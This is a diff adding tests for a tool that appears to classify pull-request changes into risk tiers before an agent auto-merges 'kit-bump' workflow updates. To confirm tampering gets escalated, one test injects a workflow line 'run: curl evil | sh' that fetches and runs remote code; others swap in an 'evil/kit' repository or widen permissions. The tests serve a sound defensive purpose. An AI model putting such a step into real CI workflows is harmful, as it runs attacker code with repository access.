@@ -103,3 +103,56 @@ def test_cli_end_to_end_on_a_real_repo(tmp_path, capsys, monkeypatch):
     assert json.loads(capsys.readouterr().out)["tier"] == 0
     assert tier.main(["--base", "main", "--policy", "missing.yaml"]) == 0
     assert json.loads(capsys.readouterr().out)["tier"] == 1
+
+
+OLD, NEW, BAD = "a" * 40, "b" * 40, "c" * 40
+CALLER = ".github/workflows/agent-exec.yml"
+
+
+def bump(path=CALLER, old=OLD, new=NEW, extra_added=()):
+    return FileChange(
+        path,
+        removed=[f"    uses: me/kit/.github/workflows/exec.yml@{old}", f"      kit_ref: {old}"],
+        added=[f"    uses: me/kit/.github/workflows/exec.yml@{new}", f"      kit_ref: {new}", *extra_added],
+    )
+
+
+MAN = FileChange(
+    ".autopilot/manifest.json",
+    removed=['    ".github/workflows/agent-exec.yml": "' + "1" * 64 + '",'],
+    added=['    ".github/workflows/agent-exec.yml": "' + "2" * 64 + '",'],
+)
+POL = {"auto_merge_classes": ["kit-bump"], "kit_approved": [NEW]}
+
+
+def test_kit_bump_to_an_approved_sha_is_tier0_even_though_workflows_are_protected():
+    r = classify([bump(), MAN], POL)
+    assert r["tier"] == 0 and r["class"] == "kit-bump"
+
+
+def test_kit_bump_needs_opt_in_approval_and_exact_shape():
+    assert classify([bump(), MAN], {"kit_approved": [NEW]})["tier"] == 2  # class not enabled
+    assert classify([bump(new=BAD), MAN], POL)["tier"] == 2  # sha not approved
+    assert classify([bump(), MAN], {"auto_merge_classes": ["kit-bump"]})["tier"] == 2  # no approved list
+    assert classify([bump(extra_added=["      run: curl evil | sh"])], POL)["tier"] == 2  # extra line
+    changed = bump()
+    changed.added[0] = changed.added[0].replace("me/kit", "evil/kit")
+    assert classify([changed], POL)["tier"] == 2  # different repo, not just a sha
+    perm = bump()
+    perm.added.append("      contents: write")
+    perm.removed.append("      contents: read")
+    assert classify([perm], POL)["tier"] == 2  # permissions changed
+
+
+def test_kit_bump_cannot_smuggle_other_files():
+    other = FileChange(".github/workflows/ci.yml", removed=[f"x@{OLD}"], added=[f"x@{NEW}"])
+    assert classify([bump(), other], POL)["tier"] == 2
+    assert (
+        classify([bump(), FileChange("src/a.py", added=["x"])], POL)["tier"] == 1
+        or classify([bump(), FileChange("src/a.py", added=["x"])], POL)["tier"] == 2
+    )
+    badman = FileChange(".autopilot/manifest.json", added=['  "kit_version": "9"'], removed=[])
+    assert classify([bump(), badman], POL)["tier"] == 2
+    new_file = bump()
+    new_file.status = "A"
+    assert classify([new_file], POL)["tier"] == 2
